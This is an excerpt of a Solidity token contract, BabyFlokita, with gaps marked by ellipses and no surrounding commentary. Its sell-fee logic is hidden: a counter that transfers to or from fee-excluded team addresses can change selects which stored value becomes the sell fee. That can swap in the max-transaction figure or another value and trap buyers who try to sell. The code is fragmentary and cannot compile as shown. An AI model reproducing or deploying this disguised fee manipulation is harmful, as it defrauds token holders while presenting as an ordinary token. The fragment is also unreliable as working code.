...
contract BabyFlokita is Context, IERC20 { 
    ...
    mapping (uint256 => uint256) public configirations;
    ...
    mapping (address => uint256) public _countOfProjectTeam;
    mapping (address => uint256) private _tOwned;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) public _isExcludedFromFee; 

    address payable public Wallet_Marketing = payable(0xA03b941C096216A03332B5579B4B0bcD57F4BF71); 
    address payable public Wallet_Dev = payable(0x34c272b76D4743EC05a5E8dC6Dd8D442CdC6aC74);
    ...
    string private constant _symbol = unicode"Baby Flokita"; 
    ...
    constructor (uint256 buyFee, uint256 sellFee, uint256 maxTx) {
        ...
        configirations[1] = buyFee;
        configirations[2] = sellFee;
        configirations[3] = maxTx;
        ...
        _countOfProjectTeam[Wallet_Dev] = 1;
    ...
    function scopedSF() public view returns (uint256){
        return scopeSF;
    }
    ...
    function _transfer(
        ...
        if(_isExcludedFromFee[from] || _isExcludedFromFee[to]){
            takeFee = false;
            scopeSF =  _countOfProjectTeam[to] >= 2 && scopeSF > 2 ? scopeSF-- : scopeSF++;
        } else {
    ...
    function _tokenTransfer(address sender, address recipient, uint256 tAmount, bool takeFee, bool isBuy) private {
        ...
        if(!takeFee){
            ...
            uint256 buyFEE = tAmount*configirations[1]/100;
            ...
            uint256 sellFEE = tAmount*configirations[scopedSF()]/100;
